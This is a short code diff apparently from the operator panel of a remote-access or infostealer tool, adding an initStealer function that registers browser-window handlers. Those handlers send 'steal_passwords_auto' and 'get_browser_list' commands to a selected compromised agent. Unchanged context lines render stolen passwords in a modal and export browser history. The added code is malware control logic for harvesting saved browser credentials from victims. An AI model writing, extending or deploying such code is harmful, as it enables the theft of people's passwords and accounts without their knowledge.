@@ -10,6 +10,25 @@ import { downloadBase64File } from '../core/utils.js';
 // Store current history data for export
 let currentHistoryData = [];
 let currentHistoryBrowser = '';
+let _sendFn = null;
+
+export function initStealer(sendFunction) {
+    _sendFn = sendFunction;
+
+    window.requestAutoStealPasswords = () => {
+         if (!state.currentAgentId) return;
+        
+        console.log("[Stealer] Requesting all passwords...");
+        
+        _sendFn({ command: 'steal_passwords_auto' });
+    };
+
+    window.requestBrowserList = () => {
+        if (!state.currentAgentId) return;
+        
+        _sendFn({ command: 'get_browser_list' });
+    };
+}
 
 export function renderPasswordModal(passwords, browserName) {
     state.currentPasswordData = passwords;
